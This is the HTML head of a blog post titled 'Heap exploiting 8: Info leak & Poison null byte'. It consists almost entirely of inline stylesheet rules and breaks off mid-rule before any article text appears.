<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Heap exploiting 8: Info leak & Poison null byte</title>
  <meta name='description' content='This blog is a means to share my research.'>

  <link rel="canonical" href="http://localhost:4000/new_blog/heap-exploiting-8/">
  <link rel="alternate" type="application/rss+xml" title="What&#39;s upsecurity" href="/new_blog/feed.xml">

  <!-- Google Font -->
  <link href="https://fonts.googleapis.com/css?family=Nunito:400,700" rel="stylesheet">
  <!-- Ionicons -->
  <link href="https://unpkg.com/ionicons@4.2.2/dist/css/ionicons.min.css" rel="stylesheet">



  <style>
  
  /*! normalize.css v8.0.0 | MIT License | github.com/necolas/normalize.css */html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}h1{font-size:2em;margin:0.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace, monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace, monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-0.25em}sup{top:-0.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:0.35em 0.75em 0.625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}template{display:none}[hidden]{display:none}body,h1,h2,h3,h4,h5,h6,p,blockquote,pre,dl,dd,ol,ul,fieldset,legend,figure,hr{margin:0;padding:0}li>ul,li>ol{margin-bottom:0}table{border-collapse:collapse;border-spacing:0}h1,h2,h3,h4,h5,h6,ul,ol,dl,blockquote,p,address,hr,table,fieldset,figure,pre{margin-bottom:15px}ul,ol,dd{margin-left:15px}.highlight{background:#2C2F36}.highlight .c{color:#998;font-style:italic}.highlight .err{color:#a61717;background-color:#e3d2d2}.highlight .k{font-weight:bold}.highlight .o{font-weight:bold}.highlight .cm{color:#998;font-style:italic}.highlight .cp{color:#999;font-weight:bold}.highlight .c1{color:#998;font-style:italic}.highlight .cs{color:#999;font-weight:bold;font-style:italic}.highlight .gd{color:#000;background-color:#fdd}.highlight .gd .x{color:#000;background-color:#faa}.highlight .ge{font-style:italic}.highlight .gr{color:#a00}.highlight .gh{color:#999}.highlight .gi{color:#000;background-color:#dfd}.highlight .gi .x{color:#000;background-color:#afa}.highlight .go{color:#888}.highlight .gp{color:#555}.highlight .gs{font-weight:bold}.highlight .gu{color:#aaa}.highlight .gt{color:#a00}.highlight .kc{font-weight:bold}.highlight .kd{font-weight:bold}.highlight .kp{font-weight:bold}.highlight .kr{font-weight:bold}.highlight .kt{color:#458;font-weight:bold}.highlight .m{color:#099}.highlight .s{color:#d14}.highlight .na{color:#008080}.highlight .nb{color:#0086B3}.highlight .nc{color:#458;font-weight:bold}.highlight .no{color:#008080}.highlight .ni{color:#800080}.highlight .ne{color:#900;font-weight:bold}.highlight .nf{color:#900;font-weight:bold}.highlight .nn{color:#555}.highlight .nt{color:#000080}.highlight .nv{color:#008080}.highlight .ow{font-weight:bold}.highlight .w{color:#bbb}.highlight .mf{color:#099}.highlight .mh{color:#099}.highlight .mi{color:#099}.highlight .mo{color:#099}.highlight .sb{color:#6d1}.highlight .sc{color:#6d1}.highlight .sd{color:#6d1}.highlight .s2{color:#6d1}.highlight .se{color:#6d1}.highlight .sh{color:#6d1}.highlight .si{color:#6d1}.highlight .sx{color:#6d1}.highlight .sr{color:#009926}.highlight .s1{color:#6d1}.highlight .ss{color:#990073}.highlight .bp{color:#999}.highlight .vc{color:#008080}.highlight .vg{color:#008080}.highlight .vi{color:#008080}.highlight .il{color:#099}.container{max-width:1200px;padding-left:15px;padding-right:15px;margin:0 auto}.container-full{max-width:100%;padding-left:15px;padding-right:15px;margin:0 auto}.row{display:flex;flex-wrap:wrap;flex:0 1 auto;flex-direction:row;box-sizing:border-box;margin-left:-15px;margin-right:-15px}.col{padding-left:15px;padding-right:15px}[class^="col-"]{flex:auto}.col-0{width:0%}.col-1{width:8.3333333333%}.col-2{width:16.6666666667%}.col-3{width:25%}.col-4{width:33.3333333333%}.col-5{width:41.6666666667%}.col-6{width:50%}.col-7{width:58.3333333333%}.col-8{width:66.6666666667%}.col-9{width:75%}.col-10{width:83.3333333333%}.col-11{width:91.6666666667%}.col-12{width:100%}.push-0{margin-left:0%}.push-1{margin-left:8.3333333333%}.push-2{margin-left:16.6666666667%}.push-3{margin-left:25%}.push-4{margin-left:33.3333333333%}.push-5{margin-left:41.6666666667%}.push-6{margin-left:50%}.push-7{margin-left:58.3333333333%}.push-8{margin-left:66.6666666667%}.push-9{margin-left:75%}.push-10{margin-left:83.3333333333%}.push-11{margin-left:91.6666666667%}.push-12{margin-left:100%}.pull-0{margin-right:0%}.pull-1{margin-right:8.3333333333%}.pull-2{margin-right:16.6666666667%}.pull-3{margin-right:25%}.pull-4{margin-right:33.3333333333%}.pull-5{margin-right:41.6666666667%}.pull-6{margin-right:50%}.pull-7{margin-right:58.3333333333%}.pull-8{margin-right:66.6666666667%}.pull-9{margin-right:75%}.pull-10{margin-right:83.3333333333%}.pull-11{margin-right:91.6666666667%}.pull-12{margin-right:100%}@media (min-width: 768px){.col-t-0{width:0%}.col-t-1{width:8.3333333333%}.col-t-2{width:16.6666666667%}.col-t-3{width:25%}.col-t-4{width:33.3333333333%}.col-t-5{width:41.6666666667%}.col-t-6{width:50%}.col-t-7{width:58.3333333333%}.col-t-8{width:66.6666666667%}.col-t-9{width:75%}.col-t-10{width:83.3333333333%}.col-t-11{width:91.6666666667%}.col-t-12{width:100%}.push-t-0{margin-left:0%}.push-t-1{margin-left:8.3333333333%}.push-t-2{margin-left:16.6666666667%}.push-t-3{margin-left:25%}.push-t-4{margin-left:33.3333333333%}.push-t-5{margin-left:41.6666666667%}.push-t-6{margin-left:50%}.push-t-7{margin-left:58.3333333333%}.push-t-8{margin-left:66.6666666667%}.push-t-9{margin-left:75%}.push-t-10{margin-left:83.3333333333%}.push-t-11{margin-left:91.6666666667%}.push-t-12{margin-left:100%}.pull-t-0{margin-right:0%}.pull-t-1{margin-right:8.3333333333%}.pull-t-2{margin-right:16.6666666667%}.pull-t-3{margin-right:25%}.pull-t-4{margin-right:33.3333333333%}.pull-t-5{margin-right:41.6666666667%}.pull-t-6{margin-right:50%}.pull-t-7{margin-right:58.3333333333%}.pull-t-8{margin-right:66.6666666667%}.pull-t-9{margin-right:75%}.pull-t-10{margin-right:83.3333333333%}.pull-t-11{margin-right:91.6666666667%}.pull-t-12{margin-right:100%}}@media (min-width: 992px){.col-d-0{width:0%}.col-d-1{width:8.3333333333%}.col-d-2{width:16.6666666667%}.col-d-3{width:25%}.col-d-4{width:33.3333333333%}.col-d-5{width:41.6666666667%}.col-d-6{width:50%}.col-d-7{width:58.3333333333%}.col-d-8{width:66.6666666667%}.col-d-9{width:75%}.col-d-10{width:83.3333333333%}.col-d-11{width:91.6666666667%}.col-d-12{width:100%}.push-d-0{margin-left:0%}.push-d-1{margin-left:8.3333333333%}.push-d-2{margin-left:16.6666666667%}.push-d-3{margin-left:25%}.push-d-4{margin-left:33.3333333333%}.push-d-5{margin-left:41.6666666667%}.push-d-6{margin-left:50%}.push-d-7{margin-left:58.3333333333%}.push-d-8{margin-left:66.6666666667%}.push-d-9{margin-left:75%}.push-d-10{margin-left:83.3333333333%}.push-d-11{margin-left:91.6666666667%}.push-d-12{margin-left:100%}.pull-d-0{margin-right:0%}.pull-d-1{margin-right:8.3333333333%}.pull-d-2{margin-right:16.6666666667%}.pull-d-3{margin-right:25%}.pull-d-4{margin-right:33.3333333333%}.pull-d-5{margin-right:41.6666666667%}.pull-d-6{margin-right:50%}.pull-d-7{margin-right:58.3333333333%}.pull-d-8{margin-right:66.6666666667%}.pull-d-9{margin-right:75%}.pull-d-10{margin-right:83.3333333333%}.pull-d-11{margin-right:91.6666666667%}.pull-d-12{margin-right:100%}}@media (min-width: 768px){.col-t-0{width:0%}.col-t-1{width:8.3333333333%}.col-t-2{width:16.6666666667%}.col-t-3{width:25%}.col-t-4{width:33.3333333333%}.col-t-5{width:41.6666666667%}.col-t-6{width:50%}.col-t-7{width:58.3333333333%}.col-t-8{width:66.6666666667%}.col-t-9{width:75%}.col-t-10{width:83.3333333333%}.col-t-11{width:91.6666666667%}.col-t-12{width:100%}.push-t-0{margin-left:0%}.push-t-1{margin-left:8.3333333333%}.push-t-2{margin-left:16.6666666667%}.push-t-3{margin-left:25%}.push-t-4{margin-left:33.3333333333%}.push-t-5{margin-left:41.6666666667%}.push-t-6{margin-left:50%}.push-t-7{margin-left:58.3333333333%}.push-t-8{margin-left:66.6666666667%}.push-t-9{margin-left:75%}.push-t-10{margin-left:83.3333333333%}.push-t-11{margin-left:91.6666666667%}.push-t-12{margin-left:100%}.pull-t-0{margin-right:0%}.pull-t-1{margin-right:8.3333333333%}.pull-t-2{margin-right:16.6666666667%}.pull-t-3{margin-right:25%}.pull-t-4{margin-right:33.3333333333%}.pull-t-5{margin-right:41.6666666667%}.pull-t-6{margin-right:50%}.pull-t-7{margin-right:58.3333333333%}.pull-t-8{margin-right:66.6666666667%}.pull-t-9{margin-right:75%}.pull-t-10{margin-right:83.3333333333%}.pull-t-11{margin-right:91.6666666667%}.pull-t-12{margin-right:100%}}@media (min-width: 992px){.col-d-0{width:0%}.col-d-1{width:8.3333333333%}.col-d-2{width:16.6666666667%}.col-d-3{width:25%}.col-d-4{width:33.3333333333%}.col-d-5{width:41.6666666667%}.col-d-6{width:50%}.col-d-7{width:58.3333333333%}.col-d-8{width:66.6666666667%}.col-d-9{width:75%}.col-d-10{width:83.3333333333%}.col-d-11{width:91.6666666667%}.col-d-12{width:100%}.push-d-0{margin-left:0%}.push-d-1{margin-left:8.3333333333%}.push-d-2{margin-left:16.6666666667%}.push-d-3{margin-left:25%}.push-d-4{margin-left:33.3333333333%}.push-d-5{margin-left:41.6666666667%}.push-d-6{margin-left:50%}.push-d-7{margin-left:58.3333333333%}.push-d-8{margin-left:66.6666666667%}.push-d-9{margin-left:75%}.push-d-10{margin-left:83.3333333333%}.push-d-11{margin-left:91.6666666667%}.push-d-12{margin-left:100%}.pull-d-0{margin-right:0%}.pull-d-1{margin-right:8.3333333333%}.pull-d-2{margin-right:16.6666666667%}.pull-d-3{margin-right:25%}.pull-d-4{margin-right:33.3333333333%}.pull-d-5{margin-right:41.6666666667%}.pull-d-6{margin-right:50%}.pull-d-7{margin-right:58.3333333333%}.pull-d-8{margin-right:66.6666666667%}.pull-d-9{margin-right:75%}.pull-d-10{margin-right:83.3333333333%}.pull-d-11{margin-right:91.6666666667%}.pull-d-12{margin-right:100%}}@media (min-width: 768px){.col-t-0{width:0%}.col-t-1{width:8.3333333333%}.col-t-2{width:16.6666666667%}.col-t-3{width:25%}.col-t-4{width:33.3333333333%}.col-t-5{width:41.6666666667%}.col-t-6{width:50%}.col-t-7{width:58.3333333333%}.col-t-8{width:66.6666666667%}.col-t-9{width:75%}.col-t-10{width:83.3333333333%}.col-t-11{width:91.6666666667%}.col-t-12{width:100%}.push-t-0{margin-left:0%}.push-t-1{margin-left:8.3333333333%}.push-t-2{margin-left:16.6666666667%}.push-t-3{margin-left:25%}.push-t-4{margin-left:33.3333333333%}.push-t-5{margin-left:41.6666666667%}.push-t-6{margin-left:50%}.push-t-7{margin-left:58.3333333333%}.push-t-8{margin-left:66.6666666667%}.push-t-9{margin-left:75%}.push-t-10{margin-left:83.3333333333%}.push-t-11{margin-left:91.6666666667%}.push-t-12{margin-left:100%}.pull-t-0{margin-right:0%}.pull-t-1{margin-right:8.3333333333%}.pull-t-2{margin-right:16.6666666667%}.pull-t-3{margin-right:25%}.pull-t-4{margin-right:33.3333333333%}.pull-t-5{margin-right:41.6666666667%}.pull-t-6{margin-right:50%}.pull-t-7{margin-right:58.3333333333%}.pull-t-8{margin-right:66.6666666667%}.pull-t-9{margin-right:75%}.pull-t-10{margin-right:83.3333333333%}.pull-t-11{margin-right:91.6666666667%}.pull-t-12{margin-right:100%}}@media (min-width: 992px){.col-d-0{width:0%}.col-d-1{width:8.3333333333%}.col-d-2{width:16.6666666667%}.col-d-3{width:25%}.col-d-4{width:33.3333333333%}.col-d-5{width:41.6666666667%}.col-d-6{width:50%}.col-d-7{width:58.3333333333%}.col-d-8{width:66.6666666667%}.col-d-9{width:75%}.col-d-10{width:83.3333333333%}.col-d-11{width:91.6666666667%}.col-d-12{width:100%}.push-d-0{margin-left:0%}.push-d-1{margin-left:8.3333333333%}.push-d-2{margin-left:16.6666666667%}.push-d-3{margin-left:25%}.push-d-4{margin-left:33.3333333333%}.push-d-5{margin-left:41.6666666667%}.push-d-6{margin-left:50%}.push-d-7{margin-left:58.3333333333%}.push-d-8{margin-left:66.6666666667%}.push-d-9{margin-left:75%}.push-d-10{margin-left:83.3333333333%}.push-d-11{margin-left:91.6666666667%}.push-d-12{margin-left:100%}.pull-d-0{margin-right:0%}.pull-d-1{margin-right:8.3333333333%}.pull-d-2{margin-right:16.6666666667%}.pull-d-3{margin-right:25%}.pull-d-4{margin-right:33.3333333333%}.pull-d-5{margin-right:41.6666666667%}.pull-d-6{margin-right:50%}.pull-d-7{margin-right:58.3333333333%}.pull-d-8{margin-right:66.6666666667%}.pull-d-9{margin-right:75%}.pull-d-10{margin-right:83.3333333333%}.pull-d-11{margin-right:91.6666666667%}.pull-d-12{margin-right:100%}}@media (min-width: 992px){.d-hide{display:none !important}.d-show{display:block !important}}*,*::after,*::before{box-sizing:border-box}body{font-family:"Nunito",sans-serif;font-size:16px;line-height:28px;color:#C9D3E7;background:#2C2F36;overflow-x:hidden;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}body input,body textarea{border:#3E4250 1px solid;outline:none}body input:focus:required:invalid,body textarea:focus:required:invalid{border-color:#e02f40}body input:required:valid,body textarea:required:valid{border-color:#34a74e}::placeholder{color:#666}*::selection{color:#fff;background-color:#1ABC9C}h1,h2,h3,h4,h5,h6{line-height:initial}h1{font-size:36px}h2{font-size:28px}h3{font-size:24px}h4{font-size:20px}h5{font-size:18px}h6{font-size:16px}blockquote{padding-left:15px;border-left:3px solid #1ABC9C;font-style:normal}pre{overflow:auto;padding:15px;margin-bottom:0;font-size:14px;white-space:pre-wrap;word-wrap:break-word;word-break:break-all}img{max-width:100%;height:auto;vertical-align:middle}img+em{text-align:center;display:block;margin-top:10px;font-weight:normal;font-size:16px;color:#707890}a{text-decoration:none;color:#1ABC9C;transition:.35s}a:hover{color:#3ee4c4}hr{display:block;height:2px;padding:0;margin:30px 0;line-height:0;border:0;background-color:#3E4250}blockquote{padding:15px 15px 15px 30px;font-size:18px;font-style:normal;border-left:4px solid #1ABC9C}blockquote p{margin-bottom:0}pre{overflow:auto;padding:15px;margin-bottom:0;font-size:14px;white-space:pre-wrap;word-wrap:break-word;word-break:break-all}.table-container{max-width:100%;overflow-x:auto}table{font-size:12px;color:#101010;width:100%;border-width:1px;border-color:#707890;border-collapse:collapse}table th{padding:8px;font-size:16px;text-align:left;border:1px solid #707890;color:#fff;background-color:#1ABC9C}table tr{background-color:#c5f7ed;transition:all .3s ease}table tr:nth-child(even){background-color:#fff}table td{padding:8px;font-size:14px;border:1px solid #707890}table tr:hover{background-color:#fff}.preloader{position:fixed;top:0;left:0;right:0;bottom:0;z-index:999;overflow:hidden;background:#101010}.loader{position:absolute;top:50%;left:50%;transform:translate(-50%, -50%);padding:10px;font-family:'Nunito', sans-serif;font-size:21px;letter-spacing:.5em;text-transform:uppercase;font-weight:700;color:#fff;background:#101010}.loader span{color:#fff;mix-blend-mode:difference}.loader:before{content:'';position:absolute;top:0;left:0;width:60px;height:100%;background:#fff;animation:animate 3s linear infinite}@keyframes animate{0%{left:0}50%{left:calc(100% - 70px)}100%{left:0}}.button{display:inline-block;white-space:nowrap;vertical-align:middle;font:inherit;text-align:center;padding:8px 30px;border-radius:3px;cursor:pointer;transition:.35s}.button--primary{color:#fff;background-color:#1ABC9C}.button--primary:hover{background-color:#117964;color:#fff;transition:.35s}.button--big{display:block;width:100%}.sidebar{margin-bottom:30px}.widget{padding:40px 15px;margin-bottom:30px;background:rgba(35,36,39,0.95);box-shadow:0 9px 18px 0 rgba(0,0,0,0.25)}.widget .widget-title{position:relative;padding-bottom:15px;margin-bottom:20px;font-size:21px;text-align:center}.widget .widget-title:after{content:"";position:absolute;left:50%;bottom:0;transform:translateX(-50%);display:block;width:50px;height:2px;background:#3E4250}.recent-posts{display:flex;flex-wrap:wrap;align-items:center;margin-bottom:15px}.recent-posts:hover .recent-image::before{background:rgba(0,0,0,0.15);transition:all .5s ease}.recent-posts:hover .recent-content .recent-title a{color:#3ee4c4}.recent-posts:last-child{margin-bottom:0}.recent-posts .recent-header{width:100%;margin-bottom:10px;background:#101010}.recent-posts .recent-header.reveal-in .recent-image{opacity:1}.recent-posts .recent-image{position:relative;display:block;width:100%;height:220px;background-size:contain;background-position:center;background-repeat:no-repeat;background-color:#101010;box-shadow:0 9px 18px 0 rgba(0,0,0,0.25);opacity:0;transition:all 1s cubic-bezier(0.6, 0.3, 0, 1)}.recent-posts .recent-image:after{content:"";display:table;padding-top:20%}.recent-posts .recent-image:before{content:"";position:absolute;width:100%;height:100%;transition:all .5s ease}.recent-posts .recent-content{margin:5px 0}.recent-posts .recent-content .recent-title{margin-bottom:0;font-weight:700}.recent-posts .recent-content .recent-title a{font-size:18px;color:#C9D3E7}.recent-posts .recent-content .recent-date{font-size:12px;color:#707890}.social-profiles{text-align:center}.social-profiles .social-profiles-item{display:inline-block;margin:3px}.social-profiles .social-profiles-link{display:inline-block;line-height:16px;padding:8px 10px;border:1px solid #3E4250;border-radius:3px;color:#3E4250}.social-profiles .social-profiles-link:hover{border-color:#1ABC9C;color:#1ABC9C}.social-profiles .social-profiles-link i{font-size:18px}.widget-instagram .instagram-box{text-align:center}.widget-instagram .instagram-box .instagram-grid{margin-bottom:30px}.widget-instagram .instagram-box .instagram-item{width:33.333%;padding:3px;float:left;overflow:hidden}.widget-instagram .instagram-box .instagram-item a{position:relative;display:block}.widget-instagram .instagram-box .instagram-item a:after{content:"";position:absolute;top:0;display:block;height:100%;width:100%;background:rgba(35,36,39,0.3);transition:.35s}.widget-instagram .instagram-box .instagram-item a:hover:after{background:transparent}.widget-instagram .instagram-box .instagram-prof{font-size:14px;color:#3E4250}.widget-instagram .instagram-box .instagram-prof:hover{text-decoration:underline}.widget-newsletter{text-align:center}.widget-newsletter .newsletter-subtitle{margin-bottom:20px;font-size:18px}.widget-newsletter .newsletter-text{max-width:170px;margin:0 auto 30px;font-size:14px;line-height:19px}.widget-newsletter .newsletter-group-top{position:relative}.widget-newsletter .email-icon{position:absolute;top:50%;left:10px;font-size:22px;transform:translateY(-50%);color:rgba(44,47,54,0.4)}.widget-newsletter .newsletter-email,.widget-newsletter .newsletter-button{width:100%;height:50px;border:none;outline:none}.widget-newsletter .newsletter-email{padding:15px 15px 15px 33px}.widget-newsletter .newsletter-button{margin-top:20px;font-size:14px;font-weight:700;cursor:pointer;color:#fff;background:#2C2F36;transition:.35s}.widget-newsletter .newsletter-button:hover{background:#1ABC9C}.tag-list .tag-item{display:inline-block;margin:3px}.tag-list .tag-item:last-child{margin-right:0}.tag-list .tag-item .tag{display:inline-block;padding:5px 15px;font-size:12px;border-radius:3px;color:#C9D3E7;background:#2C2F36}.tag-list .tag-item .tag:hover{color:#fff;background:#1ABC9C}@media only screen and (min-width: 576px){.widget{padding:40px}}@media only screen and (min-width: 768px){.recent-posts .recent-header{margin-bottom:5px}.recent-posts .recent-image{height:120px}.recent-posts .recent-content .recent-title a{font-size:16px}}@media only screen and (min-width: 992px){.recent-posts{flex-wrap:nowrap}.recent-posts .recent-header{width:auto;margin-right:15px}.recent-posts .recent-image{width:110px}}.pagination{margin:20px 0 40px}.pagination .pagination-list{display:flex;align-items:center;text-align:center}.pagination .pagination-list .older-posts,.pagination .pagination-list .previous-posts,.pagination .pagination-list .newer-posts{display:inline-block;flex-grow:1}.pagination .pagination-list .older-posts .older-link,.pagination .pagination-list .older-posts .previous-link,.pagination .pagination-list .older-posts .newer-link,.pagination .pagination-list .previous-posts .older-link,.pagination .pagination-list .previous-posts .previous-link,.pagination .pagination-list .previous-posts .newer-link,.pagination .pagination-list .newer-posts .older-link,.pagination .pagination-list .newer-posts .previous-link,.pagination .pagination-list .newer-posts .newer-link{display:flex;justify-content:center;align-items:center;padding:20px 35px;font-size:14px;line-height:18px;font-weight:bold;color:#C9D3E7;background:rgba(35,36,39,0.95);transition:.35s}.pagination .pagination-list .older-posts .older-link:hover,.pagination .pagination-list .older-posts .previous-link:hover,.pagination .pagination-list .older-posts .newer-link:hover,.pagination .pagination-list .previous-posts .older-link:hover,.pagination .pagination-list .previous-posts .previous-link:hover,.pagination .pagination-list .previous-posts .newer-link:hover,.pagination .pagination-list .newer-posts .older-link:hover,.pagination .pagination-list .newer-posts .previous-link:hover,.pagination .pagination-list .newer-posts .newer-link:hover{background:rgba(28,29,31,0.95)}.pagination .pagination-list .older-link i{margin-left:10px}.pagination .pagination-list .previous-link i,.pagination .pagination-list .newer-link i{margin-right:10px}@media only screen and (min-width: 768px){.pagination{margin:20px 0}}.footer{padding:50px 0;margin-top:30px;background:#101010}.footer-top{display:flex;justify-content:space-between;align-items:center;padding-bottom:15px;margin-bottom:10px;border-bottom:1px solid #3E4250}.footer-top .logo-text{font-size:16px;font-weight:700;line-height:16px;text-transform:uppercase;letter-spacing:5px;color:#C9D3E7}.footer-top .logo-text:hover{color:#707890}.footer-top .top{display:flex;justify-content:center;align-items:center;width:30px;height:30px;border:1px solid #2C2F36;background-color:#2C2F36;color:#C9D3E7;cursor:pointer;transition:.35s;opacity:.5}.footer-top .top:hover{opacity:1}.footer-bottom{display:flex;align-items:center;flex-wrap:wrap}.footer-bottom .copyright{margin-right:60px}.footer-bottom .copyright p{margin-bottom:0;font-size:13px;color:#707890}.footer-bottom .copyright p a{color:#707890}.footer-bottom .copyright p a:hover{color:#1ABC9C}.footer-bottom .footer-social ul li{display:inline-block;margin-left:15px}.footer-bottom .footer-social ul li:first-child{margin-left:0}.footer-bottom .footer-social ul li a{font-size:13px;font-weight:bold;color:#707890;transition:.35s}.footer-bottom .footer-social ul li a:hover{color:#1ABC9C}.header{margin-bottom:50px;background:#101010}.header,.header-box{height:60px}.header-box{display:flex;flex-direction:row;justify-content:space-between;align-items:center}.header-box .logo-title .logo-text{font-size:16px;font-weight:700;line-height:16px;text-transform:uppercase;letter-spacing:5px;color:#C9D3E7}.header-box .logo-title .logo-text:hover{color:#fff}.nav-menu,.search{position:fixed;top:0;left:0;right:0;bottom:0;transform:scale(0.5);z-index:-1;background:#2C2F36;overflow-y:auto;opacity:0}.nav-menu.active,.search.active{transition:all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);transform:scale(1);z-index:10;opacity:1}.menu-list{max-width:750px;width:100%;margin:5% auto 0;padding:15px;list-style:none;overflow-y:auto}.menu-list .menu-item{text-align:center}.menu-list .menu-link{position:relative;font-size:30px;font-weight:700;line-height:60px;color:#C9D3E7}.menu-list .menu-link:before{content:'';position:absolute;left:0;bottom:0;width:100%;height:5px;pointer-events:none;background:#3DDCA1;transform:scale3d(0, 1, 1);transform-origin:100% 50%;transition:transform 0.35s cubic-bezier(0.8, 0, 0.2, 1)}.menu-list .menu-link:hover:before{transform:scale3d(1, 1, 1);transform-origin:0 50%}.search-close-button{margin:0 auto 50px}.menu-close{margin:20% auto 0}.menu-close,.search-close-button{display:flex;justify-content:center;align-items:center;width:40px;height:40px;font-size:40px;border-radius:50%;border:2px solid #707890;color:#707890;transition:all .35s;cursor:pointer}.menu-close:hover,.search-close-button:hover{border-color:#C9D3E7;color:#C9D3E7}.nav-menu .menu-link,.nav-buttons i.ion{transition:color .35s}.nav-menu .menu-link:hover,.nav-buttons i.ion:hover{color:#fff}.nav-buttons i.ion{margin-left:10px;font-size:20px;vertical-align:middle;color:#C9D3E7;cursor:pointer}.nav-buttons i.ion:first-child{margin-left:0}.search-box{max-width:750px;width:100%;margin:10% auto 0;padding:15px;text-align:center}.search-box .search-text{width:100%;height:60px;margin-bottom:30px;text-align:center;font-size:18px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:#c1c1c7;background:#4f505d}.search-box .search-text::placeholder{color:#c1c1c7}.search-results-list{margin:0}.search-results-list .search-item{margin-bottom:15px;list-style:decimal inside;text-align:left;border-bottom:2px solid #323743;white-space:nowrap}.search-results-list .search-item .search-link{display:inline-block;width:100%;padding:15px;font-size:21px;color:#fff;white-space:normal}.search-results-list .search-item .search-link:hover{color:#707890}.search-results-list .search-no-item{font-size:18px;color:#e02f40;list-style:none}.article-first{background:rgba(35,36,39,0.95);margin-bottom:30px}.article-first .article-image-first{position:relative;display:flex;align-items:flex-end;justify-content:center;min-height:450px;background-size:contain;background-position:center;background-repeat:no-repeat;box-shadow:0 9px 18px 0 rgba(0,0,0,0.25)}.article-first .article-image-first:before{content:"";display:table}.article-first .article-content-first{padding:20px;color:#C9D3E7}.article-first .article-content-first .article-tag .tag{font-size:12px}.article-first .article-content-first .article-date .date{font-size:12px;color:rgba(201,211,231,0.8)}.article-first .article-content-first .article-title{width:50%;margin:0 auto;margin-bottom:20px;font-size:30px;line-height:30px;font-weight:normal}.article-first .article-content-first .article-title a{color:#C9D3E7;transition:.35s}.article-first .article-content-first .article-excerpt{max-width:450px;margin-bottom:30px;font-size:14px;line-height:23px}.article-first .article-content-first .button{font-size:14px;font-weight:700;border:1px solid #c9d3e7;color:#C9D3E7;transition:.35s}.article-first .article-content-first .button:hover{border:1px solid #1ABC9C;background:#1ABC9C;color:#fff}.article{display:flex;margin-bottom:25px}.article:hover .article-image .image-overlay-text{opacity:1}.article:hover .article-image .image-overlay{opacity:.5;width:100%}.article .article-box{padding-bottom:20px;border-bottom:2px solid #3E4250}.article .article-head{background:#101010}.article .article-image{position:relative;display:block;margin-bottom:20px;background-size:contain;background-position:center;background-repeat:no-repeat;background-color:#101010;box-shadow:0 9px 18px 0 rgba(0,0,0,0.25);background-size:contain}.article .article-image:before{content:"";display:table;padding-top:75%}.article .article-image .image-overlay{position:absolute;top:0;right:0;bottom:0;left:0;width:0;height:100%;background-color:rgba(0,0,0,0.8);opacity:0;transition:all 0.4s ease}.article .article-image .image-overlay-text{position:absolute;top:50%;left:50%;font-size:110px;text-align:center;letter-spacing:2px;color:#C9D3E7;transform:translate(-50%, -50%);transition:all 0.4s ease 0.3s;opacity:0}.article .article-content .article-info{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;margin-bottom:5px}.article .article-content .article-info .article-date{font-size:12px;color:rgba(201,211,231,0.8)}.article .article-content .article-info .article-tag .tag{display:inline-block;padding:2px 5px;margin-right:5px;font-size:12px;line-height:18px;font-weight:bold;border:1px solid #1ABC9C;border-radius:3px;text-transform:capitalize;color:#1ABC9C;transition:.35s}.article .article-content .article-info .article-tag .tag:last-child{margin-right:0}.article .article-content .article-info .article-tag .tag:hover{background:#1ABC9C;color:#fff}.article .article-content .article-title{margin-bottom:5px}.article .article-content .article-title a{font-size:24px;color:#C9D3E7}.article .article-content .article-excerpt{margin-bottom:0;font-size:15px;line-height:25px;color:#707890}.article-box{position:relative;overflow:hidden}.article-first .article-image-first,.article-box .article-image{position:relative;opacity:0;transition:all 1s cubic-bezier(0.6, 0.3, 0, 1)}.article-first.reveal-in .article-image-first,.article-box.reveal-in .article-image{opacity:1}@media only screen and (min-width: 576px){.article-first .article-content-first .article-title{font-size:45px;line-height:45px}.article-first .article-content-first .article-excerpt{margin-bottom:50px}.menu-list .menu-link{font-size:50px;line-height:80px}.menu-list .menu-link:before{height:8px}.search-box .search-text{height:80px;margin-bottom:30px;font-size:24px}}@media only screen and (min-width: 768px){.article-first .article-content-first{padding:60px 40px 0}}@media only screen and (min-width: 992px){.nav-menu{position:relative;display:block;transform:none;opacity:1;z-index:10;background:transparent}.nav-menu .menu-list{padding:0;margin:0}.nav-menu .menu-list .menu-item{display:inline-block;margin:0 15px 0 0}.nav-menu .menu-list .menu-item:last-child{margin-right:0}.nav-menu .menu-list .menu-link{font-size:13px;font-weight:700;text-transform:uppercase;line-height:19px}.nav-menu .menu-list .menu-link:before{content:none}.nav-menu .menu-close{display:none}.nav-menu .menu-link,.nav-buttons i.ion{transition:color .35s}.nav-menu .menu-link:hover,.nav-buttons i.ion:hover{color:#fff}}.post{margin-bottom:20px}.post-image-box{background:#101010}.post-image-box.reveal-in .post-image{opacity:1}.post-image{min-height:430px;margin-bottom:30px;background-size:contain;background-position:center;background-repeat:no-repeat;background-color:#101010;box-shadow:0 9px 18px 0 rgba(0,0,0,0.25);position:relative;opacity:0;transition:all 1s cubic-bezier(0.6, 0.3, 0, 